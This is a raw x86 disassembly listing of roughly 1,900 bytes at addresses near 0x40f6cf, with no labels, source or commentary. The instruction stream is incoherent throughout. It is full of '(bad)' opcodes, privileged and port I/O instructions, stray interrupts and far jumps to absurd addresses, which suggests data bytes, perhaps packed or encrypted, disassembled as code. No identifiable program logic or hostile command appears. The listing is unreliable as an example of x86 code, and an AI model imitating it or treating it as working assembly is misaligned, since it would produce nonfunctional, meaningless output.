  40f6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6d0:	fsubp  st(1),st
  40f6d2:	inc    ebx
  40f6d3:	pop    eax
  40f6d4:	shl    BYTE PTR [ebx],0xe7
  40f6d7:	cmp    ch,BYTE PTR [edx-0x7012b8f6]
  40f6dd:	ins    BYTE PTR es:[edi],dx
  40f6de:	scas   eax,DWORD PTR es:[edi]
  40f6df:	mov    dl,0x7f
  40f6e1:	mov    al,0x53
  40f6e3:	adc    al,0xd3
  40f6e5:	inc    esp
  40f6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e7:	mul    DWORD PTR [eax+0x618df2bd]
  40f6ed:	cmp    DWORD PTR [eax+0x79],ecx
  40f6f0:	cmc    
  40f6f1:	xor    DWORD PTR [ebp+0x54b786a],edx
  40f6f7:	adc    BYTE PTR [ebx+0x52],al
  40f6fa:	pop    eax
  40f6fb:	fwait
  40f6fc:	out    dx,al
  40f6fd:	adc    al,0x68
  40f6ff:	dec    ebx
  40f700:	in     al,0x88
  40f702:	adc    BYTE PTR [ebp+0x714b8ec],al
  40f708:	push   ebx
  40f709:	shl    cl,0xfd
  40f70c:	jo     0x40f76b
  40f70e:	mov    ds:0x1e8c94dc,eax
  40f713:	mov    WORD PTR [edx+0x31],?
  40f716:	call   0xa37d440f
  40f71b:	in     eax,0xc6
  40f71d:	adc    BYTE PTR [ecx+eax*4],cl
  40f720:	or     dl,BYTE PTR [edi]
  40f722:	fisttp WORD PTR [ebx]
  40f724:	sar    edx,cl
  40f726:	jmp    0xd01f3bf8
  40f72b:	and    esi,esp
  40f72d:	mov    eax,0x6eef8d24
  40f732:	fs daa 
  40f734:	mov    ah,0x9
  40f736:	aaa    
  40f737:	push   0x6e
  40f739:	gs push edx
  40f73b:	out    0x75,eax
  40f73d:	inc    edx
  40f73e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f73f:	pop    eax
  40f740:	hlt    
  40f741:	mov    al,0x94
  40f743:	inc    ebp
  40f744:	stc    
  40f745:	pop    ds
  40f746:	jp     0x40f6cb
  40f748:	fidivr WORD PTR [esi]
  40f74a:	jp     0x40f733
  40f74c:	iret   
  40f74d:	test   BYTE PTR [eax-0x66],dl
  40f750:	pop    edi
  40f751:	fcomp  DWORD PTR [edx]
  40f753:	lea    ecx,[edx-0x1e]
  40f756:	add    ebp,DWORD PTR [edi+ebx*4+0x12cecac5]
  40f75d:	xor    al,0x89
  40f75f:	jae    0x40f760
  40f761:	sub    eax,0xac6232b0
  40f766:	test   eax,0xea49360e
  40f76b:	ds pop ds
  40f76d:	dec    ecx
  40f76e:	pop    esi
  40f76f:	mov    ecx,0xeae35de
  40f774:	xchg   edi,eax
  40f775:	push   ss
  40f776:	pop    ecx
  40f777:	pop    esi
  40f778:	retf   0xd7db
  40f77b:	jnp    0x40f709
  40f77d:	setbe  BYTE PTR [eax+ebx*2-0x374fc5be]
  40f785:	fsubr  QWORD PTR ds:0x90170052
  40f78b:	xor    DWORD PTR [edi],esi
  40f78d:	int3   
  40f78e:	jns    0x40f773
  40f790:	ret    
  40f791:	vpmaxsw xmm7,xmm0,XMMWORD PTR [eax-0x14cf2029]
  40f799:	push   edx
  40f79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f79b:	xor    eax,0xe9a3fccd
  40f7a0:	mov    ebx,0x6640d863
  40f7a5:	cmp    al,0xd
  40f7a7:	mov    ss,WORD PTR [eax+ecx*2+0x57]
  40f7ab:	mov    dl,0x7e
  40f7ad:	push   ecx
  40f7ae:	not    BYTE PTR [edi-0x2646a82f]
  40f7b4:	mov    WORD PTR [esi-0xcd79e3c],ss
  40f7ba:	jmp    0x40f81e
  40f7bc:	dec    edi
  40f7bd:	mov    ds:0x49162108,eax
  40f7c2:	cmp    BYTE PTR [esi-0x19],bh
  40f7c5:	xor    BYTE PTR [edx+edx*1+0x2a530e60],ch
  40f7cc:	mov    dh,bh
  40f7ce:	int    0xa
  40f7d0:	stc    
  40f7d1:	xchg   ebp,eax
  40f7d2:	imul   ebp,esi,0x56
  40f7d5:	sub    cl,BYTE PTR [ebp-0x5a]
  40f7d8:	shl    DWORD PTR [edx+0x6c],1
  40f7db:	das    
  40f7dc:	inc    edi
  40f7dd:	xchg   edx,eax
  40f7de:	cwde   
  40f7df:	sar    BYTE PTR [edx],1
  40f7e1:	xor    eax,0x3ff1d23f
  40f7e6:	sbb    BYTE PTR [ecx],cl
  40f7e8:	sbb    al,0x6a
  40f7ea:	xor    eax,0x64779576
  40f7ef:	push   esi
  40f7f0:	or     ebx,DWORD PTR [ebx]
  40f7f2:	sbb    ecx,DWORD PTR [esi+0x5f8a2256]
  40f7f8:	sti    
  40f7f9:	js     0x40f80a
  40f7fb:	pusha  
  40f7fc:	popf   
  40f7fd:	mov    esi,0x5e59dad7
  40f802:	cdq    
  40f803:	push   0x5a
  40f805:	xchg   ebx,eax
  40f806:	and    edx,DWORD PTR [eax+0x34d845c2]
  40f80c:	sub    edx,ebp
  40f80e:	adc    eax,0x666e8475
  40f813:	sbb    ch,ah
  40f815:	push   ecx
  40f816:	imul   esi,DWORD PTR [edi-0x2],0x1debf3b7
  40f81d:	sbb    al,0xb6
  40f81f:	call   0x5f9e78fd
  40f824:	and    al,0x4e
  40f826:	and    eax,0x465b9493
  40f82b:	inc    esi
  40f82c:	nop
  40f82d:	jle    0x40f825
  40f82f:	into   
  40f830:	add    eax,0x69644090
  40f835:	xor    eax,0xee988097
  40f83a:	lea    esi,[ebp+0x37]
  40f83d:	cmp    ebx,DWORD PTR ds:0x19d868cf
  40f843:	sbb    al,BYTE PTR [edx+0x35]
  40f846:	jp     0x40f7e7
  40f848:	pop    ebp
  40f849:	push   0xed9a85de
  40f84e:	pop    esi
  40f84f:	icebp  
  40f850:	sbb    DWORD PTR [edx],edi
  40f852:	lahf   
  40f853:	mov    ecx,0x13f5e133
  40f858:	add    esp,DWORD PTR [eax+0x3e]
  40f85b:	mov    dh,0x80
  40f85d:	int    0xaf
  40f85f:	popf   
  40f860:	xchg   ebp,eax
  40f861:	and    BYTE PTR [ecx],ch
  40f863:	push   0x4db73870
  40f868:	inc    esp
  40f869:	or     eax,0xdda5423a
  40f86e:	push   eax
  40f86f:	arpl   WORD PTR [eax],ax
  40f871:	and    DWORD PTR [ecx+0x55235b8],eax
  40f877:	clc    
  40f878:	mov    ch,0xc9
  40f87a:	ins    BYTE PTR es:[edi],dx
  40f87b:	out    dx,al
  40f87c:	sbb    esi,eax
  40f87e:	or     BYTE PTR [edx+0x5c],ah
  40f881:	jp     0x40f854
  40f883:	repz aas 
  40f885:	jp     0x40f887
  40f887:	inc    ebx
  40f888:	in     eax,dx
  40f889:	mov    esi,0x92df147c
  40f88e:	int    0x2c
  40f890:	or     eax,0x73f880a3
  40f895:	cld    
  40f896:	pop    ecx
  40f897:	lds    edi,FWORD PTR [esi]
  40f899:	inc    eax
  40f89a:	call   0xd6856765
  40f89f:	jae    0x40f8ce
  40f8a1:	std    
  40f8a2:	int    0x7c
  40f8a4:	shr    DWORD PTR [ecx+ebx*1-0x4d43398e],cl
  40f8ab:	dec    ebx
  40f8ac:	or     dl,BYTE PTR [ebp+0x58]
  40f8af:	adc    ah,ah
  40f8b1:	xchg   esp,eax
  40f8b2:	sub    ah,BYTE PTR [ecx-0x3495a10d]
  40f8b8:	es aad 0x26
  40f8bb:	push   eax
  40f8bc:	cmove  edi,DWORD PTR [edi-0x12]
  40f8c0:	or     DWORD PTR [ebp+0x3964fb33],esi
  40f8c6:	imul   esp,DWORD PTR [esi-0x52691f93],0xc1d3d077
  40f8d0:	fs push ebp
  40f8d2:	lods   eax,DWORD PTR ds:[esi]
  40f8d3:	lods   al,BYTE PTR ds:[esi]
  40f8d4:	retf   
  40f8d5:	mov    esi,0x87b50829
  40f8da:	add    ebp,DWORD PTR [esi]
  40f8dc:	sahf   
  40f8dd:	lock and edx,DWORD PTR [esi]
  40f8e0:	xchg   edi,eax
  40f8e1:	test   al,0xa3
  40f8e3:	inc    edx
  40f8e4:	pop    esp
  40f8e5:	fiadd  WORD PTR [eax+ecx*1+0x30]
  40f8e9:	sbb    DWORD PTR [edi+0x6a],ebp
  40f8ec:	add    eax,0x332ac34f
  40f8f1:	lahf   
  40f8f2:	out    0xb7,al
  40f8f4:	lods   eax,DWORD PTR ds:[esi]
  40f8f5:	clc    
  40f8f6:	sti    
  40f8f7:	pop    edx
  40f8f8:	pusha  
  40f8f9:	mov    eax,0xffbc13db
  40f8fe:	jnp    0x40f951
  40f900:	ret    
  40f901:	shl    BYTE PTR [esi+0x1765f251],1
  40f907:	dec    esp
  40f908:	xchg   edi,eax
  40f909:	sbb    BYTE PTR [edx-0x11],ch
  40f90c:	adc    dl,BYTE PTR [edi-0x25]
  40f90f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f910:	xchg   esi,eax
  40f911:	(bad)  
  40f912:	ds mov ebp,0xcfdd31eb
  40f918:	mov    WORD PTR ds:0x38ad4a0c,es
  40f91e:	or     DWORD PTR [eax+0x20],0xffffff9c
  40f922:	push   ds
  40f923:	sti    
  40f924:	jp     0x40f96b
  40f926:	mov    dh,0x41
  40f928:	dec    eax
  40f929:	adc    ah,BYTE PTR [ecx]
  40f92b:	inc    edx
  40f92c:	mov    eax,0x9a99b0dd
  40f931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f932:	xchg   esi,ebx
  40f934:	add    ebx,ebp
  40f936:	add    al,0x68
  40f938:	mov    edx,0x3c3fd505
  40f93d:	push   ebx
  40f93e:	cmp    BYTE PTR [esi-0x6a],dl
  40f941:	loop   0x40f8ec
  40f943:	push   0xe5b36eb9
  40f948:	jmp    0x40f903
  40f94a:	nop
  40f94b:	faddp  st(1),st
  40f94d:	inc    eax
  40f94e:	icebp  
  40f94f:	ds aam 0x88
  40f952:	(bad)  
  40f953:	pop    edi
  40f954:	and    eax,0x3d9d5b01
  40f959:	and    cl,al
  40f95b:	push   ds
  40f95c:	iret   
  40f95d:	das    
  40f95e:	pop    ebp
  40f95f:	js     0x40f90b
  40f961:	leave  
  40f962:	push   eax
  40f963:	jp     0x40f9da
  40f965:	pop    eax
  40f966:	sbb    al,0x97
  40f968:	or     edx,edi
  40f96a:	mov    al,ds:0x2a837fa7
  40f96f:	push   ss
  40f970:	(bad)  
  40f971:	mov    WORD PTR [ebp-0x76f2512a],ds
  40f977:	hlt    
  40f978:	add    eax,0xebbe0516
  40f97d:	sub    eax,0xca157763
  40f982:	into   
  40f983:	pop    gs
  40f985:	(bad)  [eax+0x56]
  40f988:	std    
  40f989:	aaa    
  40f98a:	test   eax,0xde4a72e4
  40f98f:	dec    ecx
  40f990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f991:	jo     0x40f9a8
  40f993:	jmp    0x69f6:0xb88f1030
  40f99a:	mov    ebp,DWORD PTR [ebp*4+0x2aab382f]
  40f9a1:	or     al,BYTE PTR [eax+0x4fb9da2a]
  40f9a7:	xor    al,0x2b
  40f9a9:	pop    ebp
  40f9aa:	stos   BYTE PTR es:[edi],al
  40f9ab:	mov    al,ds:0x27bc0f82
  40f9b0:	xor    dh,BYTE PTR [esi+0x1b]
  40f9b3:	nop
  40f9b4:	cmp    eax,0x175ad0cc
  40f9b9:	cmp    eax,0x3a469143
  40f9be:	pop    edi
  40f9bf:	or     eax,DWORD PTR [eax-0x28]
  40f9c2:	pop    eax
  40f9c3:	mov    ds:0xa186ff99,eax
  40f9c8:	mov    ah,0x5b
  40f9ca:	push   es
  40f9cb:	jge    0x40fa32
  40f9cd:	daa    
  40f9ce:	fsubr  DWORD PTR [ebp-0x3c]
  40f9d1:	imul   edx,DWORD PTR [eax+0xeb7bfe2],0x1d
  40f9d8:	rol    BYTE PTR [esi],1
  40f9da:	lods   al,BYTE PTR ds:[esi]
  40f9db:	sbb    al,0xc0
  40f9dd:	int    0xde
  40f9df:	sub    edi,esi
  40f9e1:	inc    edx
  40f9e2:	mov    edi,0x6d2fb3b9
  40f9e7:	ja     0x40fa30
  40f9e9:	cmc    
  40f9ea:	daa    
  40f9eb:	add    dl,BYTE PTR [ebp+0x30]
  40f9ee:	and    DWORD PTR [ebx-0x50b30ea9],0xffffffd4
  40f9f5:	shl    BYTE PTR [ecx+0x11],cl
  40f9f8:	div    BYTE PTR [ecx]
  40f9fa:	test   DWORD PTR [edx+0x43],eax
  40f9fd:	cmp    BYTE PTR [edx+0x4],dh
  40fa00:	mov    ebp,0xc3e60f7e
  40fa05:	ins    BYTE PTR es:[edi],dx
  40fa06:	push   edi
  40fa07:	mov    DWORD PTR [ebp+0x3d],esp
  40fa0a:	jmp    0x40fa69
  40fa0c:	xor    cl,ah
  40fa0e:	call   0x36433c65
  40fa13:	lahf   
  40fa14:	jb     0x40fa04
  40fa16:	pop    ds
  40fa17:	xchg   DWORD PTR [edi-0x6095cfed],eax
  40fa1d:	(bad)  
  40fa1e:	inc    DWORD PTR ds:0x3bdb4999
  40fa24:	or     cl,bh
  40fa26:	outs   dx,BYTE PTR ds:[esi]
  40fa27:	and    DWORD PTR [edi+0x30f66e70],edi
  40fa2d:	pop    eax
  40fa2e:	push   edi
  40fa2f:	daa    
  40fa30:	mov    ebx,0x3d0e4fe5
  40fa35:	fadd   DWORD PTR [edi-0x3c629f5e]
  40fa3b:	int3   
  40fa3c:	jne    0x40f9d9
  40fa3e:	out    dx,al
  40fa3f:	mov    dl,0x92
  40fa41:	out    dx,eax
  40fa42:	push   ebp
  40fa43:	int3   
  40fa44:	jl     0x40faab
  40fa46:	arpl   si,bx
  40fa48:	icebp  
  40fa49:	sub    ebp,edx
  40fa4b:	and    eax,0x8dd5762b
  40fa50:	cwde   
  40fa51:	pop    esp
  40fa52:	test   al,0x11
  40fa54:	xor    BYTE PTR [eax],dh
  40fa56:	cld    
  40fa57:	inc    edx
  40fa58:	gs adc al,0x7e
  40fa5b:	sub    al,0x6b
  40fa5d:	sub    eax,0x2ba5d4dd
  40fa62:	inc    ebx
  40fa63:	cmp    DWORD PTR [ecx-0x471baa4],ebx
  40fa69:	fcomp  st(3)
  40fa6b:	fstp   TBYTE PTR [esi]
  40fa6d:	mov    ds:0xf78ddb47,eax
  40fa72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa73:	jb     0x40fa92
  40fa75:	push   eax
  40fa76:	std    
  40fa77:	adc    al,0x1f
  40fa79:	loopne 0x40fa1b
  40fa7b:	xor    BYTE PTR [ebp+0x64],cl
  40fa7e:	sub    al,0x53
  40fa80:	jge    0x40fa5a
  40fa82:	cs xor eax,0x7752eb98
  40fa88:	mov    esi,0xb0bf81b0
  40fa8d:	int    0xc4
  40fa8f:	xchg   ebx,eax
  40fa90:	loope  0x40fa9b
  40fa92:	fstp   DWORD PTR [ecx]
  40fa94:	jo     0x40faa0
  40fa96:	dec    edi
  40fa97:	mov    ch,0xe
  40fa99:	pop    esi
  40fa9a:	dec    ebp
  40fa9b:	jmp    0x40fa52
  40fa9d:	mov    bl,BYTE PTR [edi]
  40fa9f:	in     al,dx
  40faa0:	leave  
  40faa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faa2:	mov    ebx,DWORD PTR [ebx-0x327a542]
  40faa8:	nop
  40faa9:	fisub  DWORD PTR [eax-0x594610a0]
  40faaf:	out    dx,al
  40fab0:	xor    al,0xb6
  40fab2:	outs   dx,BYTE PTR ds:[esi]
  40fab3:	or     ch,BYTE PTR [esi-0x46ea782f]
  40fab9:	cmp    eax,0xbc505d18
  40fabe:	add    DWORD PTR [ecx+0x7d7499d3],esp
  40fac4:	sbb    ebx,DWORD PTR ds:0x62ee3b87
  40faca:	call   0xc126:0x14fce7f9
  40fad1:	inc    ecx
  40fad2:	(bad)  
  40fad4:	push   es
  40fad5:	hlt    
  40fad6:	daa    
  40fad7:	jne    0x40fb3d
  40fad9:	xor    BYTE PTR [ebp+0x29],dl
  40fadc:	aas    
  40fadd:	fiadd  WORD PTR [edi+esi*2+0x13065d76]
  40fae4:	and    al,0xf1
  40fae6:	push   ebx
  40fae7:	cmp    eax,0xdee468d0
  40faec:	test   al,0xa2
  40faee:	xor    eax,0xf6a7ebe6
  40faf3:	sar    al,1
  40faf5:	outs   dx,DWORD PTR ds:[esi]
  40faf6:	pop    esp
  40faf7:	push   es
  40faf8:	inc    esi
  40faf9:	or     eax,ebx
  40fafb:	jle    0x40fa96
  40fafd:	xor    al,0xb8
  40faff:	sbb    ebp,DWORD PTR [edx-0x5d1b95da]
  40fb05:	cmp    eax,0x7707bbd8
  40fb0a:	test   BYTE PTR ds:0xbdc107a8,dl
  40fb10:	out    dx,al
  40fb11:	test   al,0xd
  40fb13:	(bad)  
  40fb14:	out    dx,eax
  40fb15:	hlt    
  40fb16:	imul   BYTE PTR [eax+0x48]
  40fb19:	xchg   DWORD PTR [eax-0x12],edi
  40fb1c:	jmp    0x40fb7e
  40fb1e:	pop    ss
  40fb1f:	das    
  40fb20:	leave  
  40fb21:	test   BYTE PTR [edi-0x1c],cl
  40fb24:	inc    ecx
  40fb25:	adc    edi,DWORD PTR [eax]
  40fb27:	mov    esp,DWORD PTR [edx+0x7]
  40fb2a:	pushf  
  40fb2b:	sbb    dl,al
  40fb2d:	outs   dx,DWORD PTR ds:[esi]
  40fb2e:	cwde   
  40fb2f:	arpl   WORD PTR [bx],ax
  40fb32:	inc    esp
  40fb33:	dec    ecx
  40fb34:	jecxz  0x40fb17
  40fb36:	sub    BYTE PTR [esi-0x500fc5bf],bh
  40fb3c:	sub    ah,BYTE PTR ds:0xfbf5a3c0
  40fb42:	test   DWORD PTR [esi],edi
  40fb44:	test   al,0x6f
  40fb46:	jns    0x40fb80
  40fb48:	dec    ecx
  40fb49:	fld    TBYTE PTR [esi]
  40fb4b:	sbb    al,0x97
  40fb4d:	(bad)  
  40fb4e:	cmp    eax,0x26c1560a
  40fb53:	data16 ficom DWORD PTR [edi-0x5aa805b6]
  40fb5a:	push   esi
  40fb5b:	js     0x40fb18
  40fb5d:	pop    edx
  40fb5e:	retf   0xa155
  40fb61:	aad    0xf0
  40fb63:	jae    0x40fb42
  40fb65:	lock xor BYTE PTR [ebx+edi*2-0x27479001],bh
  40fb6d:	(bad)
  40fb71:	mov    dl,0xba
  40fb73:	dec    edx
  40fb74:	sbb    esi,ebx
  40fb76:	sbb    DWORD PTR [edx-0x31],esp
  40fb79:	add    ch,BYTE PTR [ebx-0x80]
  40fb7c:	not    DWORD PTR [edi]
  40fb7e:	and    DWORD PTR [edx-0x16],ebx
  40fb81:	push   ecx
  40fb82:	(bad)  
  40fb83:	mov    ds:0xd65cb357,al
  40fb88:	popf   
  40fb89:	mov    WORD PTR [ebx+0x25c2c3b6],?
  40fb8f:	cmp    BYTE PTR [ecx-0x4f],bh
  40fb92:	mov    ch,0xee
  40fb94:	fcmovu st,st(0)
  40fb96:	adc    al,0xad
  40fb98:	or     esp,DWORD PTR ds:0x717c5fda
  40fb9e:	xor    al,0x48
  40fba0:	call   0x12ff0a3e
  40fba5:	inc    sp
  40fba7:	jle    0x40fbb2
  40fba9:	mov    al,ds:0x4b2bc91b
  40fbae:	lods   eax,DWORD PTR ds:[esi]
  40fbaf:	xor    DWORD PTR [edx+0x32bc855e],0x56
  40fbb6:	not    BYTE PTR [edi]
  40fbb8:	(bad)  
  40fbb9:	jp     0x40fb90
  40fbbb:	jmp    0x40fbae
  40fbbd:	je     0x40fbae
  40fbbf:	and    cl,BYTE PTR [ebx+0x18]
  40fbc2:	sahf   
  40fbc3:	cmp    al,0xaf
  40fbc5:	xchg   BYTE PTR [ebp+0x56],cl
  40fbc8:	fisubr DWORD PTR [edi+0x3559a46f]
  40fbce:	fisttp QWORD PTR ds:[ebx-0x72]
  40fbd2:	mov    ebx,0x7e79f6a2
  40fbd7:	mov    ?,WORD PTR [ebx-0x20]
  40fbda:	or     al,0xbc
  40fbdc:	sbb    ebx,edi
  40fbde:	ins    DWORD PTR es:[edi],dx
  40fbdf:	add    eax,esi
  40fbe1:	aam    0xe3
  40fbe3:	jle    0x40fb9b
  40fbe5:	ret    0x7a2b
  40fbe8:	cmp    esp,ebp
  40fbea:	inc    eax
  40fbeb:	outs   dx,BYTE PTR ds:[esi]
  40fbec:	xchg   edi,eax
  40fbed:	leave  
  40fbee:	pop    ecx
  40fbef:	aas    
  40fbf0:	test   eax,0x275306bc
  40fbf5:	fmul   QWORD PTR [eax-0x5c6ba00d]
  40fbfb:	jl     0x40fc5c
  40fbfd:	imul   ebp,DWORD PTR [ecx+0x14],0x4bc07ff0
  40fc04:	inc    ecx
  40fc05:	cs mov edi,0x4cd44d86
  40fc0b:	xchg   edx,eax
  40fc0c:	sbb    DWORD PTR [ebp+0xd],edx
  40fc0f:	pop    esp
  40fc10:	cmp    DWORD PTR [ebp+0x5fd1fa12],ebp
  40fc16:	(bad)  
  40fc17:	mov    ebp,0x1e25f8d9
  40fc1c:	cmc    
  40fc1d:	cmp    eax,0xec9c40b3
  40fc22:	sbb    esi,DWORD PTR [edx-0x2a1fd949]
  40fc28:	and    eax,0xa0d5e458
  40fc2d:	scas   eax,DWORD PTR es:[edi]
  40fc2e:	xchg   esp,eax
  40fc2f:	(bad)  
  40fc30:	mov    al,0xe0
  40fc32:	cmp    DWORD PTR [esi-0x17],ebx
  40fc35:	fcomp  DWORD PTR es:[edi-0x18]
  40fc39:	popa   
  40fc3a:	pusha  
  40fc3b:	rol    DWORD PTR [edx+ecx*4-0x45],0xf8
  40fc40:	push   ebx
  40fc41:	retf   0xab7f
  40fc44:	push   esi
  40fc45:	retf   0xd7ca
  40fc48:	hlt    
  40fc49:	(bad)  
  40fc4b:	ror    BYTE PTR [ebp+ebx*2-0x74421b48],cl
  40fc52:	ds rol bh,0xe8
  40fc56:	neg    DWORD PTR [eax-0x3a3f7a17]
  40fc5c:	dec    ebp
  40fc5d:	and    BYTE PTR ds:0xf457e356,dl
  40fc63:	retf   0x677d
  40fc66:	dec    eax
  40fc67:	lock in al,0xf4
  40fc6a:	cmp    DWORD PTR [eax-0x69],ebp
  40fc6d:	xor    eax,0x2e03f10a
  40fc72:	cmp    al,0x86
  40fc74:	test   al,0x5f
  40fc76:	aaa    
  40fc77:	jmp    0x6c4:0x8c633839
  40fc7e:	les    edi,FWORD PTR [edx]
  40fc80:	push   ss
  40fc81:	loop   0x40fc4b
  40fc83:	mov    ecx,0xa29361aa
  40fc88:	inc    esi
  40fc89:	and    eax,0x56442b67
  40fc8e:	stos   DWORD PTR es:[edi],eax
  40fc8f:	or     DWORD PTR [edi-0x3f],0x5a9778c9
  40fc96:	rcl    edx,0xb8
  40fc99:	push   0xfffffff0
  40fc9b:	test   BYTE PTR [ecx+edx*4],ch
  40fc9e:	cmp    eax,0x6c0ea134
  40fca3:	aas    
  40fca4:	mov    ch,BYTE PTR [ebx+0x3e8c28c0]
  40fcaa:	jge    0x40fc34
  40fcac:	push   es
  40fcad:	hlt    
  40fcae:	lods   eax,DWORD PTR ds:[esi]
  40fcaf:	rol    BYTE PTR [ebx],cl
  40fcb1:	jmp    0x40fd1b
  40fcb3:	jmp    0x40fd06
  40fcb5:	mov    DWORD PTR [ebx],ecx
  40fcb7:	repnz adc eax,DWORD PTR [ebx-0x3]
  40fcbb:	nop
  40fcbc:	sub    al,0xad
  40fcbe:	pop    ebx
  40fcbf:	imul   eax,DWORD PTR [esi-0x479c748d],0xbaed3310
  40fcc9:	add    al,0xfb
  40fccb:	sub    cl,dh
  40fccd:	mov    bh,0x8
  40fccf:	jmp    0x33274dcc
  40fcd4:	sbb    BYTE PTR [esp+edx*1-0x77],al
  40fcd8:	add    al,0x12
  40fcda:	in     eax,dx
  40fcdb:	imul   BYTE PTR ds:0x3c0a933b
  40fce1:	movzx  esp,WORD PTR [eax]
  40fce4:	pop    ecx
  40fce5:	(bad)  
  40fce7:	jnp    0x40fd3a
  40fce9:	shl    esi,1
  40fceb:	pop    eax
  40fcec:	add    BYTE PTR [eax],bl
  40fcee:	jae    0x40fd3b
  40fcf0:	fisub  DWORD PTR [eax+0x33]
  40fcf3:	pop    ecx
  40fcf4:	arpl   sp,di
  40fcf6:	or     DWORD PTR [ebx+0x74],eax
  40fcf9:	jge    0x40fd38
  40fcfb:	add    bl,BYTE PTR [eax]
  40fcfd:	not    esp
  40fcff:	pop    edx
  40fd00:	ret    0xabe4
  40fd03:	xchg   ecx,eax
  40fd04:	mov    dh,0xc4
  40fd06:	xor    eax,0x37c6a7fc
  40fd0b:	inc    ecx
  40fd0c:	xchg   esi,eax
  40fd0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd0e:	jl     0x40fce5
  40fd10:	jecxz  0x40fd82
  40fd12:	pop    edi
  40fd13:	sub    eax,0x96f1d898
  40fd18:	loop   0x40fcbb
  40fd1a:	xor    DWORD PTR [ecx-0x37],0xfffffffd
  40fd1e:	pop    esp
  40fd1f:	pop    eax
  40fd20:	dec    edx
  40fd21:	test   DWORD PTR [eax],ebp
  40fd23:	push   0x20bb8333
  40fd28:	scas   al,BYTE PTR es:[edi]
  40fd29:	mul    bl
  40fd2b:	sahf   
  40fd2c:	push   ds
  40fd2d:	stos   DWORD PTR es:[edi],eax
  40fd2e:	adc    ecx,esi
  40fd30:	push   ebx
  40fd32:	es scas eax,DWORD PTR es:[edi]
  40fd34:	pop    edi
  40fd35:	dec    esp
  40fd36:	je     0x40fcbc
  40fd38:	push   ds
  40fd39:	test   BYTE PTR [ecx],cl
  40fd3b:	xor    bl,bh
  40fd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd3e:	inc    eax
  40fd3f:	jnp    0x40fcfd
  40fd41:	add    eax,edi
  40fd43:	dec    ecx
  40fd44:	in     al,0x6d
  40fd46:	(bad)  
  40fd48:	sbb    DWORD PTR [edx+0x4df9e048],esi
  40fd4e:	mov    edx,0xff8e66a6
  40fd53:	lahf   
  40fd54:	nop
  40fd55:	enter  0x2e9c,0xa4
  40fd59:	xchg   ebx,eax
  40fd5a:	sbb    DWORD PTR [edi+0x37],esi
  40fd5d:	sti    
  40fd5e:	add    eax,0x9c125a06
  40fd63:	neg    bh
  40fd65:	add    DWORD PTR ds:0x60256bf0,eax
  40fd6b:	loopne 0x40fdae
  40fd6d:	jmp    0x49b82653
  40fd72:	sub    BYTE PTR [ebp+esi*2+0x3b6c7e3a],ah
  40fd79:	cdq    
  40fd7a:	push   ss
  40fd7b:	mov    cl,0x60
  40fd7d:	cld    
  40fd7e:	sar    DWORD PTR [edx+ebx*4+0x4b86b0c],0x94
  40fd86:	fxch   st(2)
  40fd88:	rcl    BYTE PTR [ebp-0x71e3a3e9],1
  40fd8e:	rol    BYTE PTR ds:0xfe65f0e8,cl
  40fd94:	jb     0x40fdfb
  40fd96:	scas   al,BYTE PTR es:[edi]
  40fd97:	icebp  
  40fd98:	jno    0x40fe07
  40fd9a:	mov    dh,0x8b
  40fd9c:	lods   al,BYTE PTR ds:[esi]
  40fd9d:	and    esp,edx
  40fd9f:	repnz inc edx
  40fda1:	adc    BYTE PTR [esi],ah
  40fda3:	sbb    ch,BYTE PTR [ebx+0x67779b42]
  40fda9:	les    esp,FWORD PTR [ecx+ecx*2]
  40fdac:	xor    DWORD PTR [edx-0x774d3600],esi
  40fdb2:	stos   BYTE PTR es:[edi],al
  40fdb3:	or     dl,BYTE PTR [ebx+0x56]
  40fdb6:	mov    eax,ds:0x4c87a534
  40fdbb:	lahf   
  40fdbc:	mov    esp,0x418567be
  40fdc1:	sub    BYTE PTR cs:[edx-0x51],dl
  40fdc5:	lahf   
  40fdc6:	sti    
  40fdc7:	xor    ch,BYTE PTR [ecx]
  40fdc9:	push   edx
  40fdca:	jmp    0xa2d1:0xea5fe1ab
  40fdd1:	mov    ebx,0xb031596a
  40fdd6:	out    0xff,al
  40fdd8:	push   edx
  40fdd9:	jmp    0xc934:0x14cf7a42
  40fde0:	das    
  40fde1:	or     DWORD PTR [esi-0x5d],ebx
  40fde4:	ja     0x40fdfc
  40fde6:	popf   
  40fde7:	fdivr  DWORD PTR [ebx+0x59]
  40fdea:	js     0x40fdba
  40fdec:	stos   BYTE PTR es:[edi],al
  40fded:	(bad)  
  40fdee:	shl    DWORD PTR [edx],cl
  40fdf0:	dec    ebx
  40fdf1:	jle    0x40fdff
  40fdf3:	push   ss
  40fdf4:	pop    eax
  40fdf5:	bound  ecx,QWORD PTR [esi-0x21fe20de]
  40fdfb:	imul   edx,DWORD PTR [ecx+0x76e8c00a],0x403d7490
  40fe05:	sub    BYTE PTR [eax+0x6faa6a83],0x73
  40fe0c:	loop   0x40fdb9
  40fe0e:	scas   al,BYTE PTR es:[edi]
  40fe0f:	inc    edx
  40fe10:	pop    eax
  40fe11:	ret    0xf6ae
  40fe14:	pop    esi
  40fe15:	xchg   esp,eax
  40fe16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe17:	test   BYTE PTR ds:0xa8bc38b8,dl
  40fe1d:	xchg   ecx,eax
  40fe1e:	sbb    edx,DWORD PTR [edi]
  40fe20:	dec    esi
  40fe21:	dec    ebx
  40fe22:	popf   
  40fe23:	mov    ds,WORD PTR [eax-0x14]
  40fe26:	aas    
  40fe27:	nop
  40fe28:	(bad)  
  40fe29:	mov    WORD PTR [edi],ss
  40fe2b:	or     al,0xcd
  40fe2d:	jg     0x40fe94
  40fe2f:	push   ebx
  40fe30:	sub    DWORD PTR [edx],edi
  40fe32:	mov    ds:0xdb18a46c,al
  40fe37:	fmul   DWORD PTR [edi-0x4e]
  40fe3a:	popf   
  40fe3b:	cmp    DWORD PTR [edx+0x46],ecx
  40fe3e:	push   ecx
